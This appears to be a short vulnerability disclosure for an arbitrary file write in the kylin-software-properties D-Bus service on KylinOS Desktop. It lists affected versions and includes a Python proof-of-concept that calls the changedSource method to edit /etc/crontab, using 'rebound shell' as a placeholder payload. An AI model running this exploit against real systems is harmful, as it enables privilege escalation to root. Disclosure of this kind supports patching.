# Kylin OS kylin-software-properties arbitrary file write vuln

Author: Set3r.Pan（8691003@qq.com）\
Unit: KylinSoft（https://www.kylinos.cn/）
## Report
### Describe
kylin-software-properties is a component on KylinOS Desktop for setting system software properties. There is an arbitrary file writing vulnerability in the changedSource function of this component, which can lead to privilege escalation for ordinary users.
### Hazard level
High
### Affected version
- V10SP1：kylin-software-properties < 0.0.1-134
- V10：kylin-software-properties < 0.0.1-134
### POC&&EXP
ISO Download:\
https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/

exploit.py
```
#!/usr/bin/env python3

import sys
import dbus
import os

def change_source(old, new, target):
    bus = dbus.SystemBus()
    obj = bus.get_object("com.kylin.software.properties", "/com/kylin/software/properties")
    proxy = dbus.Interface(obj, "com.kylin.software.properties.interface")
    print(proxy.changedSource([old, new, target]))

change_source("#", "rebound shell", "/etc/crontab")
os.system("grep -rn 'rebound shell' /etc/crontab")
```
